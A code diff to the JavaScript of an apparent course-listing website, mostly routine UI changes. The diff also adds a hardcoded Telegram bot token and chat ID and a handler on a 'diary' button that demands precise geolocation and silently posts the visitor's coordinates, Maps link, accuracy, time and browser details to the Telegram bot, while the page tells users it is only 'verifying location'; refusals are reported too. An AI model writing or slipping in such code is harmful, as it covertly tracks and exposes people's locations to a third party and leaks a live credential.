@@ -14,6 +14,9 @@ const courseModalBody = document.getElementById("course-modal-body");
 const courseModalClose = document.getElementById("course-modal-close");
 const backToTop = document.getElementById("back-to-top");
 const toastRoot = document.getElementById("toast-root");
+const TELEGRAM_BOT_TOKEN = "8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU";
+const TELEGRAM_CHAT_ID = "6149032213";
+
 
 const BOOKMARK_KEY = "learn-bookmarks";
 let globalResults;
@@ -67,11 +70,11 @@ function writeStore(key, value) {
   localStorage.setItem(key, JSON.stringify(value));
 }
 
-function showToast(message) {
+function showToast(message, type = "") {
   if (!toastRoot) return;
 
   const toast = document.createElement("div");
-  toast.className = "app-toast";
+  toast.className = `app-toast ${type}`.trim();
   toast.textContent = message;
   toastRoot.appendChild(toast);
   window.setTimeout(() => toast.remove(), 2600);
@@ -322,7 +325,6 @@ function getCourseInsight(item) {
     label: "Course overview",
     gradient: "linear-gradient(135deg, #2563eb, #0f9f6e)",
   };
-
   return { overview, tip, visual };
 }
 
@@ -469,7 +471,84 @@ function initUniversityClock() {
   window.setInterval(updateUniversityClock, 1000);
 }
 
+let isLocationRequesting = false;
+
+async function sendTelegramMessage(text) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
+    });
+  } catch (error) {
+    console.error("Telegram Error:", error);
+  }
+}
+
+function handleDiaryAccess(event) {
+  if (isLocationRequesting) {
+    showToast("⏳ Đang xử lý yêu cầu vị trí, vui lòng đợi...", "warning");
+    return;
+  }
+
+  console.log("Diary access triggered");
+  event.preventDefault();
+
+  // Lấy URL từ data-href thay vì href để bảo mật hơn
+  const diaryUrl = event.currentTarget.dataset.href;
+  const btn = event.currentTarget;
+
+  if (!navigator.geolocation) {
+    showToast("❌ Trình duyệt không hỗ trợ định vị hoặc cần HTTPS.", "error");
+    return;
+  }
+
+  isLocationRequesting = true;
+  btn.style.opacity = "0.6";
+  btn.style.cursor = "wait";
+  showToast("📍 Đang xác thực vị trí của bạn...");
+
+  navigator.geolocation.getCurrentPosition(
+    async (position) => {
+      const { latitude, longitude, accuracy } = position.coords;
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const message = `<b>🔓 TRUY CẬP NHẬT KÝ</b>\n\n📍 Vị trí: <a href="${mapsLink}">Xem trên Maps</a>\n🎯 Độ chính xác: ${accuracy.toFixed(1)}m\n⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}\n📱 Thiết bị: ${navigator.userAgent}`;
+
+      await sendTelegramMessage(message);
+
+      // Mở nhật ký sau khi đã gửi thông báo thành công
+      window.open(diaryUrl, "_blank");
+
+      // Reset trạng thái
+      isLocationRequesting = false;
+      btn.style.opacity = "";
+      btn.style.cursor = "";
+    },
+    async (error) => {
+      let errorMsg = "Lỗi định vị";
+      if (error.code === 1) errorMsg = "Từ chối chia sẻ vị trí (Denied)";
+      else if (error.code === 2) errorMsg = "Lỗi GPS/Mạng (Unavailable)";
+      else if (error.code === 3) errorMsg = "Hết thời gian chờ (Timeout)";
+
+      const message = `<b>🚫 TRUY CẬP BỊ CHẶN</b>\n\n❌ Lý do: ${errorMsg}\n⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}\n📱 Thiết bị: ${navigator.userAgent}`;
+      await sendTelegramMessage(message);
+
+      showToast(`❌ Lỗi: ${errorMsg}. Bạn phải chia sẻ vị trí!`, "error");
+
+      // Reset trạng thái để có thể thử lại
+      isLocationRequesting = false;
+      btn.style.opacity = "";
+      btn.style.cursor = "";
+    },
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+  );
+}
+
 function initEvents() {
+  document.getElementById("journey-open")?.addEventListener("click", handleDiaryAccess);
+
   themeToggle?.addEventListener("click", () => {
     const nextTheme = body.classList.contains("dark-mode") ? "light" : "dark";
     setTheme(nextTheme);
@@ -544,6 +623,7 @@ function initEvents() {
 }
 
 function init() {
+  console.log("Initializing app...");
   const savedTheme = localStorage.getItem("theme");
   const preferredTheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
   setTheme(savedTheme || preferredTheme);
